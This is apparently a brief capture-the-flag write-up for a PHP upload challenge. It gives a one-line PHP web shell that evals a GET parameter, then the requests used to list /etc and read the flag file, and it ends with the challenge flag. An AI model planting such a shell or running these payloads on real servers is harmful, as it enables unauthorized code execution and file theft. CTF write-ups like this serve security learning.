**Challenge**: http://wtf-php.darkarmy.xyz/

Upload a php file with the following content:
```php
<?php eval($_GET["test"]); ?>
```

Access this file and test some commands with the parameter `?test=<Command>`

Look at the functions available: `?test=phpinfo();`

As we know previously, the flag is in `/etc`. So, listing it `?test=print_r(scandir("/etc/"));` 

The flag file is: `/etc/f1@g.txt`

Reading the flag: `?test=echo(file_get_contents("/etc/f1@g.txt"));`

**Flag**: darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}
